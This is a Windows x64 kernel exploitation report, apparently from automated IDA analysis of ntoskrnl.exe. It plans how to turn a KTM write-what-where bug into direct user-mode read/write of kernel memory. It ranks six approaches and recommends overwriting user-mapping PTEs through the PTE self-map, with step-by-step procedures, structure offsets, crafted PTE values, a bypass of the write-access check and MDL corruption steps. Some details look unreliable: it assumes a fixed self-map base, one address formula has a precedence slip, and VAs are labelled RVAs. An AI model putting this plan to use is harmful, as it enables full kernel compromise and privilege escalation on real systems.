# ntoskrnl.exe Section/Mapping Analysis -- Kernel Memory to User Space

**Target:** ntoskrnl.exe (Windows x64 kernel)
**IDA Instance:** PID 8428, port 13346, IDB `C:\Users\ruar1337\Desktop\ntoskrnl.exe.i64`
**Primitive:** KTM write-what-where (arbitrary kernel memory write)
**Goal:** 200M+ ops/sec kernel R/W via direct pointer access (mapped kernel pages, zero syscall overhead)
**Date:** 2026-07-01

---

## Executive Summary -- Verdict Matrix

| # | Approach | Target | WAW Writes | Write Access | Verdict |
|---|----------|--------|------------|--------------|---------|
| A1 | Corrupt CA PhysicalMemory flag | MiMapViewOfPhysicalSection 0x1407C32E8 | 1 (OR 0x400 at CA+0x38) | Bypassable | **GO (read+write)** |
| A2 | Corrupt VAD Subsection/PrototypePte | MiMapViewOfDataSection 0x140639820 | 2 (VAD+0x48, +0x50) | Yes via proto PTE | **GO but fault-path dependent** |
| A3 | MDL PFN array corruption | MiMapLockedPagesInUserSpace 0x14076ABE0 | N (MDL+0x30) | Yes | **GO if MDL+trigger controllable** |
| A4 | Direct PTE overwrite with existing VAD | PTE self-map 0xFFFFF68000000000 | N (8B/page) | Yes (PTE Write bit) | **GO -- simplest, fastest** |
| A5 | Physical section via NtCreateSection | NtCreateSection 0x140654E50 | 0 | N/A | **NO-GO -- flag not user-settable** |
| A6 | SEC_PHYSICALMEMORY path | MiInitializeCreateSectionPacket 0x140652FC0 | 0 | N/A | **NO-GO from user mode** |

**Recommended: A4 (Direct PTE Overwrite)** -- map a section view to establish a VAD, then KTM WAW overwrites the view's PTEs in the PTE self-map to point at kernel physical pages. One 8-byte write per 4KB page. Zero syscalls per R/W after setup. The VAD prevents the MM from reclaiming the range or overwriting PTEs on soft faults.

---

## Task 1: Function Discovery and Core Decompilation

### 1.1 Function Inventory

**Section Creation:**

| Function | RVA | Size | Role |
|----------|-----|------|------|
| NtCreateSection | 0x140654E50 | 0x63 | Syscall entry, delegates to MiCreateSectionCommon |
| MiCreateSectionCommon | 0x140654AC0 | 0x325 | Validates allocation attributes, calls MiCreateSection |
| MiCreateSection | 0x140652DA0 | 0x20D | Orchestrates via MiCreateImageOrDataSection |
| MiInitializeCreateSectionPacket | 0x140652FC0 | 0x2DC | Translates SEC_* flags to internal packet flags |
| MmCreateSection | 0x140701E70 | 0x7C | Kernel API, delegates to MmCreateSectionEx |

**Section Mapping:**

| Function | RVA | Size | Role |
|----------|-----|------|------|
| NtMapViewOfSection | 0x140638420 | 0x263 | Syscall entry, calls Common then MiMapViewOfSection |
| MmMapViewOfSection | 0x1406128D0 | 0xDD | Kernel API wrapper |
| MiMapViewOfSectionCommon | 0x140638690 | 0x225 | Resolves handles, validates base/size |
| MiMapViewOfSection | 0x140639150 | 0x56E | **Core dispatcher** -- routes by CA flags |
| MiMapViewOfPhysicalSection | 0x1407C32E8 | 0x340 | **Physical mapping** -- direct PTE writes |
| MiMapViewOfImageSection | 0x14061D2D0 | 0xB39 | Image section (prototype PTE + CoW) |
| MiMapViewOfDataSection | 0x140639820 | 0xB3A | Data section (subsection + prototype PTE) |
| MiInsertViewOfPhysicalSection | 0x1403C6798 | 0x1C0 | Inserts VAD + writes physical PTEs |
| MiInsertPhysicalPteMapping | 0x1402EB468 | 0x27B | **Direct PTE writer** -- PFN into PTE |

**VAD Functions:**

| Function | RVA | Size | Role |
|----------|-----|------|------|
| MiInsertVad | 0x1402969B0 | 0x210 | Inserts VAD into process AVL tree |
| MiInsertVadCharges | 0x14063A390 | 0x1E5 | Charges commit for VAD |
| MiGetWsAndInsertVad | 0x140296700 | 0x2A6 | Locks WS + inserts VAD |
| MiDeleteVad | 0x14021BFB0 | 0xADE | Deletes VAD, releases pages |

**MDL Functions:**

| Function | RVA | Size | Role |
|----------|-----|------|------|
| MmMapLockedPagesSpecifyCache | 0x140226C80 | 0x222 | Maps MDL pages into system or user space |
| MiMapLockedPagesInUserSpace | 0x14076ABE0 | 0x354 | User-space MDL mapping with PFN validation |
| MiMapLockedPagesInUserSpaceHelper | 0x1402EB224 | 0x23E | Writes PTEs for MDL user-space mapping |
| MmSizeOfMdl | 0x1402EB830 | 0x1D | Returns MDL size = header + PFN array |
| MiLegitimatePageForDriversToMap | 0x14028026C | 0x103 | Security check for MDL user-space mapping |

### 1.2 Core Dispatcher -- MiMapViewOfSection @ 0x140639150

```c
v13 = MiSectionControlArea(a1);       // get CONTROL_AREA from section
v40 = *(_DWORD *)(v13 + 56);          // CONTROL_AREA.u.Flags at +0x38

if ( (v40 & 0x400) != 0 )             // PhysicalMemory flag (bit 10)
    v41 = MiMapViewOfPhysicalSection(a2, a3, a5, ProtectionMask, v50);
else if ( (v40 & 0x20) != 0 )         // Image flag (bit 5)
    v42 = MiMapViewOfImageSection(v13, a2, &v51, v57, a1, a6, ProtectionMask, v37);
else
    v41 = MiMapViewOfDataSection(v13, a2, a3, a5, a1, a6, ProtectionMask, v31, v50);
```

PhysicalMemory (0x400) is checked **before** Image (0x20). The control area flags at +0x38 are the sole routing determinant.

### 1.3 NtMapViewOfSection @ 0x140638420

```c
result = MiMapViewOfSectionCommon(a2, a1, 0, a3, v25, v24, v28, v21, v15, v16);
if ( result >= 0 ) {
    v12 = MiMapParametersInitialize(v20, v16[1], v27, v8, v7);
    if ( v12 >= 0 )
        v12 = MiMapViewOfSection(DmaAdapter[0], v20, v16, v23, &v17, v26, 0);
}
```

### 1.4 MmMapViewOfSection @ 0x1406128D0

```c
memset(v14, 0, sizeof(v14));
result = MiMapParametersInitialize(v14, *a7, a9, a10, a4);
if ( result >= 0 )
    result = MiMapViewOfSection(a1, v14, a3, a5, a6, a8, 1);  // kernel caller
```

---

## Task 2: Can NtCreateSection Back Sections with Existing Kernel Pages?

### MiCreateSectionCommon @ 0x140654AC0 -- Attribute Validation

```c
if ( (a6 & 0x2083FFFF) != 0 )    // bits 0-17, 23, 25 must be CLEAR
    return STATUS_INVALID_PARAMETER;
if ( (a6 & 0xF100000) == 0 )     // at least one of bits 20,24-27 must be SET
    return STATUS_INVALID_PARAMETER;
```

**Valid allocation attributes:**
- 0x01000000 = SEC_IMAGE (file-backed prototype PTEs)
- 0x04000000 = SEC_RESERVE (demand-paged, no commit)
- 0x08000000 = SEC_COMMIT (new demand-paged pages from pagefile)
- 0x10000000 = SEC_NOCACHE
- 0x20000000 = SEC_LARGE_PAGES (requires SeLockMemory privilege)
- 0x40000000 = SEC_WRITECOMBINED

**What each does for backing:**
- SEC_COMMIT: allocates new committed pages, zeroed, demand-paged. Does NOT reuse kernel pages.
- SEC_RESERVE: reserves VA only, demand-paged on access. Does NOT reuse kernel pages.
- SEC_IMAGE: file-backed prototype PTEs. Does NOT reuse kernel pages.
- SEC_LARGE_PAGES: new large pages (2MB), still freshly allocated.

**Verdict: NO-GO.** No NtCreateSection flag backs the section with existing kernel pages. The PhysicalMemory internal flag (0x400 in control area) is not settable through user-mode allocation attributes.

---

## Task 3: SECTION_OBJECT Corruption -- Fields Controlling Backing Memory

### 3.1 Structure Layouts (from IDA type inspection)

**_SECTION (64 bytes):**
```
+0x00 SectionNode     : _RTL_BALANCED_NODE (24B)
+0x18 StartingVpn     : UINT64
+0x20 EndingVpn       : UINT64
+0x28 u1              : union { ControlArea: PTR64 }  <-- CA pointer
+0x30 SizeOfSection   : UINT64
+0x38 u               : _MMSECTION_FLAGS (4B)
+0x3C InitialPageProt : 12b | SessionId: 19b | NoValidation: 1b
```

**_CONTROL_AREA (128 bytes):**
```
+0x00 Segment             : _SEGMENT *          <-- segment with prototype PTEs
+0x18 NumSectionRefs      : UINT64
+0x20 NumPfnRefs          : UINT64
+0x28 NumMappedViews     : UINT64
+0x30 NumUserRefs         : UINT64
+0x38 u                   : _MMSECTION_FLAGS    <-- FLAGS: PhysicalMemory=0x400
+0x40 FilePointer         : _EX_FAST_REF
+0x48 ControlAreaLock     : volatile int
```

**_MMSECTION_FLAGS (bitfield at CA +0x38):**
```
Bit 5  (0x020) Image           <-- routes to MiMapViewOfImageSection
Bit 10 (0x400) PhysicalMemory  <-- routes to MiMapViewOfPhysicalSection
Bit 13 (0x2000) Commit
```

**_MMVAD (136 bytes):**
```
+0x00 Core            : _MMVAD_SHORT (64B)
  +0x18 StartingVpn   : UINT
  +0x1C EndingVpn     : UINT
  +0x30 u             : _MMVAD_FLAGS (VadType:3b, Protection:5b, PageSize:2b)
+0x48 Subsection         : _SUBSECTION *       <-- backing subsection
+0x50 FirstPrototypePte  : _MMPTE *            <-- first proto PTE for view
+0x58 LastContiguousPte  : _MMPTE *
+0x70 VadsProcess        : _EPROCESS *
```

**_SUBSECTION (56 bytes):**
```
+0x00 ControlArea      : _CONTROL_AREA *
+0x08 SubsectionBase   : _MMPTE *              <-- prototype PTE array
+0x10 NextSubsection   : _SUBSECTION *
+0x2C PtesInSubsection : UINT
```

### 3.2 MiMapViewOfDataSection @ 0x140639820 -- Backing Memory Flow

```c
// 1. Locate subsection covering the requested offset
SubsectionNode = MiLocateSubsectionNode(a1, *v95, 0);

// 2. Compute prototype PTE address
v87 = *(_QWORD *)(SubsectionNode + 8) + 8 * v80;  // SubsectionBase + offset

// 3. Allocate MMVAD (136 bytes), store backing pointers
PoolMm = ExAllocatePoolMm(64, 136, ...);
*(_QWORD *)(PoolMm + 72) = SubsectionNode;   // VAD+0x48 = Subsection
*(_QWORD *)(PoolMm + 80) = v87;              // VAD+0x50 = FirstPrototypePte

// 4. Insert VAD
MiGetWsAndInsertVad(v23);
```

**Fields controlling backing memory:**
1. CONTROL_AREA.Segment (+0x00): segment with master prototype PTE chain
2. SUBSECTION.SubsectionBase (+0x08): prototype PTE array
3. MMVAD.Subsection (+0x48): subsection backing this view
4. MMVAD.FirstPrototypePte (+0x50): specific prototype PTE for first page

On page fault: VAD -> Subsection -> SubsectionBase -> PrototypePte -> physical page.

---

## Task 4: KTM WAW to Corrupt Control Area -> Map Kernel Pages

### Approach A1: Set PhysicalMemory Flag

**Target:** CONTROL_AREA.u.Flags at CA+0x38, set bit 0x400

**Procedure:**
1. Create SEC_COMMIT section via NtCreateSection (user mode)
2. KTM WAW read SECTION+0x28 to get CONTROL_AREA pointer
3. KTM WAW OR 0x400 into CONTROL_AREA+0x38
4. NtMapViewOfSection with BaseAddress = physical address of kernel pages
5. MiMapViewOfPhysicalSection maps them directly into user PTEs

**MiMapViewOfPhysicalSection @ 0x1407C32E8:**
```c
if ( (*(_DWORD *)(a1 + 60) & 2) != 0 || *(_QWORD *)(a1 + 80) )
    return STATUS_INVALID_PARAMETER;       // write-access check

v14 = MiSanitizePage(*a3 >> 12);           // BaseAddress >> 12 = PFN
// For each page: MiIsPfn validates, MiReferenceIoPages references
MiInsertViewOfPhysicalSection(v8, v12, v15);
```

**MiInsertViewOfPhysicalSection @ 0x1403C6798:**
```c
v7 = 8 * vad_start_vpn - 0x98000000000;    // PTE addr = VPN*8 + 0xFFFFF68000000000
// For each PTE:
MiInsertPhysicalPteMapping(v7, physical_PFN, cache_type);
```

**MiInsertPhysicalPteMapping @ 0x1402EB468:**
```c
ValidPte = MiMakeValidPte(a1, a2, ProtectionPfnCompatible | 0x80000000);
*a1 = ValidPte;                             // DIRECT PTE WRITE
if ( v12 ) MiWritePteShadow(a1, ValidPte);
```

**Write Access Bypass:**
The *(param+60) & 2 check blocks sections with SECTION_MAP_WRITE (0x2) in DesiredAccess.
- Create section with DesiredAccess = SECTION_MAP_READ | SECTION_QUERY (0x5), NO SECTION_MAP_WRITE
- Map view with SectionPageProtection = PAGE_READWRITE (0x4)
- ProtectionMask flows to MiMakeValidPte which sets PTE Write bit
- Also create section with SectionPageProtection = PAGE_READWRITE so MmCompatibleProtectionMask check passes

**py_eval:**
```
CA.u.Flags offset: +0x38 (56 bytes)
PhysicalMemory bit: 0x400 (bit 10)
WAW writes: 1 (read-modify-write 4 bytes at CA+0x38)
```

**Feasibility: GO.** Read + write achievable with correct section creation flags. Kernel PFNs pass MiIsPfn (valid RAM). MiSanitizePage may restrict certain ranges -- test on target.

---

## Task 5: MmCreateSection Flags Analysis

### MiInitializeCreateSectionPacket @ 0x140652FC0

```c
if ( (v13 & 0x1000000) != 0 ) {           // SEC_IMAGE
    if ( (v13 & 0x11000000) == 0x11000000 ) // SEC_IMAGE_NO_EXECUTE
        v13 &= ~0x10000000;
    else
        *a1 |= 0x400;                      // packet flag (NOT CA PhysicalMemory)
}
// SEC_LARGE_PAGES (0x20000000):
if ( (v32 & 0x20000000) != 0 && !SeSinglePrivilegeCheck(SeLockMemoryPrivilege, ...) )
    *(_DWORD *)(a2 + 40) &= ~0x20000000;   // strip if no privilege
```

The 0x400 set in the **packet** for SEC_IMAGE is an internal packet flag, NOT the same as 0x400 PhysicalMemory in _MMSECTION_FLAGS. Image sections route via the 0x20 Image bit, confirming CA PhysicalMemory is NOT set for image sections.

**Verdict: NO-GO.** No user-accessible flag reuses existing kernel memory. All SEC_* flags allocate new pages or use file-backed prototype PTEs.

---

## Task 6: Physical Memory Section (SEC_PHYSICALMEMORY)

No SEC_PHYSICALMEMORY flag exists in NtCreateSection. The PhysicalMemory bit (0x400) in _MMSECTION_FLAGS is internal, set only by:
1. Kernel internal APIs (MmMapIoSpace, etc.)
2. The `\Device\PhysicalMemory` named section (ACL-restricted on Vista+)

```c
// MiMapViewOfPhysicalSection treats BaseAddress as PHYSICAL address:
v14 = MiSanitizePage(*a3 >> 12);   // physical_addr >> 12 = PFN
```

**Verdict: NO-GO from user mode via NtCreateSection.** With KTM WAW: either set PhysicalMemory on a created section (A1), or corrupt the security descriptor on `\Device\PhysicalMemory` to allow user access.

---

## Task 7: VAD Corruption to Point User Mapping at Kernel Pages

### Approach A2: Corrupt MMVAD FirstPrototypePte

**Targets:** MMVAD+0x48 (Subsection), MMVAD+0x50 (FirstPrototypePte)

**MiInsertVad @ 0x1402969B0:**
```c
v11 = *(_QWORD *)(a2 + 2008);     // EPROCESS.VadRoot (offset 0x7D8)
RtlAvlInsertNodeEx(a2 + 2008, v13, v15, a1);  // AVL insert
```

**Procedure:**
1. Create section + map view (creates VAD with normal backing)
2. KTM WAW to locate VAD in EPROCESS AVL tree (walk from VadRoot at +0x7D8)
3. Overwrite VAD+0x50 (FirstPrototypePte) to point at a kernel prototype PTE containing a valid kernel PFN
4. Page fault on the mapped view -> fault handler reads corrupted proto PTE -> maps kernel PFN into user space

**VAD type field (MMVAD_FLAGS at +0x30, VadType 3 bits):**
- VadNone(0), VadImageMap(1), VadAwe(2), VadWriteWatch(3), VadLargePages(4), VadRotatePhysical(5)
- Changing to VadAwe(2) or VadRotatePhysical(5) could alter fault handling to allow direct physical mapping

**Challenge:** Fault handler validates prototype PTE state, subsection control area references, and PFN DB consistency. More complex than direct PTE overwrite.

**Feasibility: GO but fault-path dependent.** Requires careful prototype PTE construction. Higher risk of inconsistency checks triggering bugchecks.

---

## Task 8: MmMapLockedPagesSpecifyCache from User Mode

### MmMapLockedPagesSpecifyCache @ 0x140226C80

```c
if ( AccessMode ) {   // UserMode = 1
    locked = MiMapLockedPagesInUserSpace(MDL, v8, CacheType, RequestedAddress, Priority);
    return locked;
}
// KernelMode: reserves system PTEs, fills via MiFillSystemPtes
v15 = MiReservePtes(&qword_140C4EF80, v14, ...);
MiFillSystemPtes(v15, v10, (int)MDL + 48, v19, 0, &v27);  // MDL+48 = PFN array
```

This is a **kernel-only API**. It cannot be called from user mode. To trigger it:
1. A kernel driver must call it with our corrupted MDL
2. Or we corrupt an existing MDL that a driver is about to map
3. Or we use KTM WAW to corrupt driver code flow to call it

**MiMapLockedPagesInUserSpace @ 0x14076ABE0 -- security checks:**
```c
v7 = (_QWORD *)(a1 + 48);           // MDL PFN array at offset 0x30
v8 = ((ByteOffset & 0xFFF) + 4095 + ByteCount) >> 12;  // page count

// For each PFN in array:
if ( MiIsPfn(*v24) ) {              // valid RAM PFN?
    v27 = 48 * *v24 - 0x58000000000;  // PFN DB entry VA
    inserted = MiLegitimatePageForDriversToMap(v27);  // SECURITY CHECK
    if ( inserted < 0 || !MiDoubleLockMdlPage(v27) )
        goto FAIL;
} else {
    v31 = MiSanitizePage(*v24);     // I/O space page
    MiReferenceIoPages(1, v31, 1, ...);
}
```

**MiLegitimatePageForDriversToMap @ 0x14028026C -- the gate:**
```c
if ( !MI_PFN_IS_PROTO() ) {
    v4 = (PTE_ptr << 25) >> 16;     // compute mapped VA from PTE
    if ( v4 < 0xFFFFF68000000000 )  // below hyperspace
        return 0;                    // ALLOWED
    if ( v4 > 0xFFFFF6FFFFFFFFFF )  // above hyperspace
        return 0;                    // ALLOWED (kernel pages 0xFFFFF800+!)
    // Only hyperspace range is scrutinized
    ...
}
return 0;  // prototype PFNs always allowed
```

**Key finding:** MiLegitimatePageForDriversToMap **allows kernel pages above 0xFFFFF80000000000**! Only hyperspace pages (PTE self-map, system PTEs at 0xFFFFF680-0xFFFFF6FF) are blocked. Regular kernel code/data pages pass the check.

**Feasibility: GO if we control an MDL and trigger a driver to call MmMapLockedPagesSpecifyCache(UserMode).** The security check is permissive for normal kernel pages. Requires a vulnerable driver or KTM WAW to corrupt an existing MDL + trigger the mapping call.

---

## Task 9: MDL PFN Corruption

### _MDL Layout (48 bytes header, from IDA type inspection)

```
+0x00 Next             : _MDL * (8B)
+0x08 Size             : CSHORT (2B) -- includes header + PFN array
+0x0A MdlFlags         : CSHORT (2B)
+0x10 Process          : _EPROCESS * (8B)
+0x18 MappedSystemVa   : PVOID (8B)
+0x20 StartVa          : PVOID (8B)
+0x28 ByteCount        : ULONG (4B)
+0x2C ByteOffset       : ULONG (4B)
+0x30 PFN array        : ULONG_PTR[] (8B per entry)  <-- TARGET
```

### MDL Fields to Control for Kernel Page Mapping

| Field | Offset | Value Needed | Purpose |
|-------|--------|-------------|---------|
| Size | +0x08 | 48 + 8*page_count | MDL total size |
| MdlFlags | +0x0A | MDL_PAGES_LOCKED (0x200) | Pages are locked |
| Process | +0x10 | Target EPROCESS | Process for user-space mapping |
| StartVa | +0x20 | Any page-aligned VA | Base VA for MDL |
| ByteCount | +0x28 | page_count * 4096 | Total bytes to map |
| ByteOffset | +0x2C | 0 | Offset within first page |
| PFN[0..N] | +0x30 | kernel page PFNs | Physical page frame numbers |

### Corruption Procedure

1. Locate an existing MDL in kernel memory (or allocate one via a driver)
2. KTM WAW to overwrite MDL+0x30 (PFN array) with target kernel page PFNs
3. Update MDL+0x28 (ByteCount) to match the number of pages
4. Update MDL+0x08 (Size) to 48 + 8*page_count
5. Set MDL+0x0A (MdlFlags) to include MDL_PAGES_LOCKED (0x0200)
6. Trigger a driver to call MmMapLockedPagesSpecifyCache(MDL, UserMode, ...)

**MiMapLockedPagesInUserSpaceHelper @ 0x1402EB224 -- PTE writing:**
```c
// For each page:
MiInsertPhysicalPteMapping((__int64 *)v10, *(_QWORD *)(v21 + v10), v15);
// v10 = PTE address, v21+v10 = PFN from MDL array, v15 = protection
```

The helper reads PFNs directly from the MDL array and writes them into user-space PTEs via MiInsertPhysicalPteMapping. No additional PFN validation beyond MiLegitimatePageForDriversToMap (which allows kernel pages).

**Feasibility: GO if MDL location + driver trigger are controllable.** The security check is permissive. Main challenge is finding/creating an MDL and triggering the user-space mapping call.

---

## Task 10: MDL Size Calculations (py_eval)

### x64 MDL Header = 48 bytes (0x30)

LO's formula `sizeof(MDL) = 16 + 8 * page_count` is the **x86** formula. On x64, pointer widening doubles the header from 16 to 48 bytes (Next, Process, MappedSystemVa, StartVa each grow from 4B to 8B, plus alignment padding).

**x64 formula: `sizeof(MDL) = 48 + 8 * page_count`**

| Pages | MDL Size (bytes) | MDL Size (hex) |
|-------|-----------------|----------------|
| 1 | 56 | 0x38 |
| 4 | 80 | 0x50 |
| 16 | 176 | 0xB0 |
| 64 | 560 | 0x230 |
| 256 | 2096 | 0x830 |
| 1024 | 8240 | 0x2030 |
| 4096 | 32816 | 0x8030 |

### PTE Self-Map Calculations (py_eval)

```
PTE self-map base: 0xFFFFF68000000000
PTE address formula: PTE_VA = (VA >> 12) * 8 + 0xFFFFF68000000000
                     equivalently: PTE_VA = (VA >> 9) + 0xFFFFF68000000000
PDE address formula: PDE_VA = (PTE_VA >> 12) * 8 + 0xFFFFF68000000000
PFN DB base: 0xFFFFFA8000000000
PFN entry formula: PFN_entry_VA = 48 * PFN + 0xFFFFFA8000000000
```

**Sample PTE addresses for user VAs (py_eval):**

| User VA | PTE Address |
|---------|-------------|
| 0x10000 | 0xFFFFF68000000080 |
| 0x10000000 | 0xFFFFF68000080000 |
| 0x100000000 | 0xFFFFF68000800000 |
| 0x7FFFE0000000 | 0xFFFFF6BFFFF00000 |

### PTE Value Format (x64)

```
Bit 0: Present (Valid) -- must be 1
Bit 1: Writeable -- set for write access
Bit 2: Owner -- 0=Kernel, 1=User (MUST be 1 for user-space access)
Bits 12-51: PFN (physical page frame number)
Bit 63: NX (No Execute) -- set for data pages

User RW PTE = (PFN << 12) | 0x7 | 0x8000000000000000
User RO PTE = (PFN << 12) | 0x5 | 0x8000000000000000
```

**Sample PTE values (py_eval):**

| PFN | User RW+NX | User RO+NX |
|-----|-----------|-----------|
| 0x100 | 0x8000000000100007 | 0x8000000000100005 |
| 0x1000 | 0x8000000001000007 | 0x8000000001000005 |
| 0x10000 | 0x8000000010000007 | 0x8000000010000005 |
| 0x100000 | 0x8000000100000007 | 0x8000000100000005 |
| 0x200000 | 0x8000000200000007 | 0x8000000200000005 |

The Owner bit (0x4) is CRITICAL -- without it, user-mode access to the page triggers a fault.

---

## Detailed Approach: A4 -- Direct PTE Overwrite (Recommended)

### Concept

Instead of corrupting section/control area/VAD/MDL structures and relying on kernel code paths, directly overwrite the PTEs of an existing user-space mapping to point at kernel physical pages. The VAD stays intact, preventing the MM from reclaiming the address range.

### Step-by-Step

1. **Create a section + map a view** (user mode, normal flow):
   - NtCreateSection(SEC_COMMIT, PAGE_READWRITE, size = N * 4096)
   - NtMapViewOfSection -> base address B, view size V
   - This creates a VAD covering [B, B+V) with normal backing

2. **Resolve kernel physical addresses** (via KTM WAW):
   - For each target kernel VA, read its PTE from the PTE self-map
   - PTE address = (kernel_VA >> 12) * 8 + 0xFFFFF68000000000
   - Extract PFN from PTE bits 12-51
   - Or use MmGetPhysicalAddress equivalent via KTM WAW

3. **Overwrite user-space PTEs** (KTM WAW):
   - For each page i in the view:
     - user_PTE_addr = (B + i*4096) >> 12 * 8 + 0xFFFFF68000000000
     - kernel_PFN = (extracted from kernel page's PTE)
     - Write PTE value = (kernel_PFN << 12) | 0x7 | 0x8000000000000000
   - One 8-byte KTM WAW write per 4KB page

4. **Access kernel memory directly** (user mode):
   - `*(volatile uint64_t*)(B + offset)` reads/writes kernel memory
   - No syscalls, no driver calls -- pure pointer dereference
   - 200M+ ops/sec achievable (limited only by cache/memory bandwidth)

### Why This Works

- The VAD prevents MiUnmapViewOfSection and the working set trimmer from touching our PTEs
- Soft faults on the range find the VAD, see valid PTEs, and do nothing
- The PTE self-map is in kernel space, accessible via KTM WAW
- The Owner bit (0x4) in the PTE grants user-mode access to the page
- The Write bit (0x2) grants write access
- NX bit (0x8000000000000000) prevents accidental code execution

### Advantages Over Other Approaches

- **No kernel code path dependency:** doesn't need MiMapViewOfPhysicalSection, fault handlers, or driver calls
- **No consistency checks:** the MM doesn't validate PTE-to-VAD-to-subsection consistency on access
- **Minimal WAW writes:** one 8-byte write per 4KB page (e.g., 256 writes for 1MB of kernel memory)
- **Full read/write:** PTE Write bit set directly
- **Stable:** VAD prevents address range reclamation

### Risks and Mitigations

- **TLB shootdown:** INVLPG/TLB flush on the range could invalidate our PTE entries. Mitigate by choosing a user VA range unlikely to be flushed, or re-overwrite PTEs after flush.
- **Working set trimming:** WS expansion/contraction could scan PTEs but won't overwrite valid PTEs for a mapped view (only trims transition/standby pages).
- **PTE shadow (if enabled):** On systems with MiPteHasShadow(), the shadow PTE must also be overwritten. Check MiFlags for shadow PTE support and write both PTE and shadow.
- **NX bit:** Ensure NX is set to prevent code execution from kernel data pages, avoiding CFG/DEP violations.

### Performance Estimate (py_eval)

```
For 1MB of kernel memory (256 pages):
  KTM WAW writes for setup: 256 (one 8-byte write per PTE)
  Post-setup R/W: direct pointer dereference, ~1-3 ns per access
  Theoretical throughput: 300M-1000M ops/sec (cache-dependent)
  Practical throughput with cache misses: 200M+ ops/sec
```

---

## Appendix: Key Offsets Summary

| Structure | Field | Offset | Size | Notes |
|-----------|-------|--------|------|-------|
| _SECTION | u1.ControlArea | +0x28 | 8B | Ptr to CONTROL_AREA |
| _SECTION | SizeOfSection | +0x30 | 8B | Section size |
| _SECTION | u.Flags | +0x38 | 4B | _MMSECTION_FLAGS |
| _CONTROL_AREA | Segment | +0x00 | 8B | Ptr to _SEGMENT |
| _CONTROL_AREA | u.Flags | +0x38 | 4B | PhysicalMemory=0x400, Image=0x20 |
| _MMVAD | Core.StartingVpn | +0x18 | 4B | Starting virtual page number |
| _MMVAD | Core.EndingVpn | +0x1C | 4B | Ending virtual page number |
| _MMVAD | Core.u.VadType | +0x30 | 3b | VAD type (0=none, 2=AWE, 5=rotate) |
| _MMVAD | Subsection | +0x48 | 8B | Ptr to _SUBSECTION |
| _MMVAD | FirstPrototypePte | +0x50 | 8B | Ptr to first prototype PTE |
| _MMVAD | LastContiguousPte | +0x58 | 8B | Ptr to last contiguous PTE |
| _MMVAD | VadsProcess | +0x70 | 8B | Ptr to _EPROCESS |
| _SUBSECTION | ControlArea | +0x00 | 8B | Back-pointer to CA |
| _SUBSECTION | SubsectionBase | +0x08 | 8B | Prototype PTE array |
| _SUBSECTION | PtesInSubsection | +0x2C | 4B | PTE count |
| _MDL | Size | +0x08 | 2B | Header + PFN array size |
| _MDL | MdlFlags | +0x0A | 2B | MDL_PAGES_LOCKED=0x200 |
| _MDL | ByteCount | +0x28 | 4B | Total bytes |
| _MDL | PFN array | +0x30 | 8B*N | Physical page frame numbers |
